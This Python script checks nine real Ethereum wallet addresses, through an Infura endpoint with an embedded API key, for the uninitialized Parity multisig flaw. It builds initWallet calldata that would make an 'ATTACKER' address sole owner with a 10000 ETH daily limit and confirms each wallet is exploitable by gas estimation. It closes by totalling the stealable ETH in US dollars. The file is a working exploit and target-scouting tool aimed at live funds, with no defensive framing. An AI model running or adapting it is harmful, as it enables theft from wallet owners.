import json
import subprocess
import time

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", 
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

# Target wallets to verify
wallets = [
    "0xbd6ed4969d9e52032ee3573e643f6a1bdc0a7e1e",
    "0x3885b0c18e3c4ab0ca2b8dc99771944404687628",
    "0x4615cc10092b514258577dafca98c142577f1578",
    "0xddf90e79af4e0ece889c330fca6e1f8d6c6cf0d8",
    "0x379add715d9fb53a79e6879653b60f12cc75bcaf",
    "0xb39036a09865236d67875f6fd391e597b4c8425d",
    "0x58174e9b3178074f83888b6147c1a7d2ced85c6f",
    "0xfcbcd2da9efa379c7d3352ffd3d5877cc088cbba",
    "0x98669654f4ab5ccede76766ad19bdfe230f96c65"
]

ATTACKER = "0xdead000000000000000000000000000000000001"

# initWallet(address[] _owners, uint256 _required, uint256 _daylimit)
# selector: 0xe46dcfeb
# encoded: initWallet([ATTACKER], 1, 10000 ETH)
def build_init_calldata(attacker):
    # Encode: initWallet([attacker], 1, 10000000000000000000000)
    selector = "e46dcfeb"
    # offset to owners array: 0x60 (96 bytes)
    offset = "0000000000000000000000000000000000000000000000000000000000000060"
    # _required: 1
    required = "0000000000000000000000000000000000000000000000000000000000000001"
    # _daylimit: 10000 ETH (very high)
    daylimit = "00000000000000000000000000000000000000000000021e19e0c9bab2400000"
    # array length: 1
    arr_len = "0000000000000000000000000000000000000000000000000000000000000001"
    # attacker address (padded)
    addr = "000000000000000000000000" + attacker[2:].lower()
    return "0x" + selector + offset + required + daylimit + arr_len + addr

print("=" * 80)
print("PARITY WALLET UNINITIALIZED EXPLOIT VERIFICATION")
print("=" * 80)
print()

total_eth = 0
vulnerable = []

for wallet in wallets:
    print(f"\n--- Checking {wallet} ---")
    time.sleep(0.5)
    
    # Get balance
    bal_resp = rpc_call("eth_getBalance", [wallet, "latest"])
    if bal_resp and "result" in bal_resp:
        balance_wei = int(bal_resp["result"], 16)
        balance_eth = balance_wei / 1e18
        print(f"Balance: {balance_eth:.4f} ETH")
    else:
        print("Failed to get balance")
        continue
    
    time.sleep(0.3)
    
    # Get m_numOwners (slot 0)
    storage_resp = rpc_call("eth_getStorageAt", [wallet, "0x0", "latest"])
    if storage_resp and "result" in storage_resp:
        m_numOwners = int(storage_resp["result"], 16)
        print(f"m_numOwners: {m_numOwners}")
    else:
        print("Failed to get storage")
        continue
    
    if m_numOwners != 0:
        print(f"SKIP: Already initialized (m_numOwners = {m_numOwners})")
        continue
    
    time.sleep(0.3)
    
    # Test if initWallet can be called
    calldata = build_init_calldata(ATTACKER)
    
    gas_resp = rpc_call("eth_estimateGas", [{"to": wallet, "data": calldata, "from": ATTACKER}, "latest"])
    
    if gas_resp and "result" in gas_resp:
        gas = int(gas_resp["result"], 16)
        print(f"initWallet gas estimate: {gas} âœ“ VULNERABLE")
        vulnerable.append((wallet, balance_eth, gas))
        total_eth += balance_eth
    elif gas_resp and "error" in gas_resp:
        print(f"initWallet failed: {gas_resp['error'].get('message', 'unknown')}")
    else:
        print("Gas estimation failed - response error")

print("\n" + "=" * 80)
print("SUMMARY OF EXPLOITABLE WALLETS")
print("=" * 80)

if vulnerable:
    print(f"\n{'Address':<44} {'Balance':<12} {'Gas'}")
    print("-" * 70)
    for addr, bal, gas in sorted(vulnerable, key=lambda x: -x[1]):
        print(f"{addr}  {bal:>10.2f} ETH  {gas}")
    print("-" * 70)
    print(f"{'TOTAL':<44}  {total_eth:>10.2f} ETH")
    print()
    print(f"At ETH=$2,500: ~${total_eth * 2500:,.2f} USD")
else:
    print("No vulnerable wallets found!")

